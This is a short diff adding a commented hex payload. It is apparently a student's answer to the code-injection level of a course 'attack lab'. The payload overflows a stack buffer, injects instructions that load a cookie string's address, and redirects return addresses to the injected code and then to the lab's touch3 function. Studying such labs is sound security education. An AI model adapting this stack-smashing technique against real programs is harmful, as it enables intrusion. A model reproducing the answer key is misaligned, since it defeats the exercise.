@@ -1,0 +1,6 @@
+35 39 62 39 39 37 66 61 /* the cookie: "59b997fa" */
+48 c7 c7 78 dc 61 55 /* movq $0x5561dc78,%rdi */    
+c3 /* retq */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* 24 paddings */
+80 dc 61 55 00 00 00 00 /* return address of the injected code, equals to: 0x5561dc78 + 8 = 0x5561dc80 */
+fa 18 40 00 00 00 00 00 /* return address of touch3 */
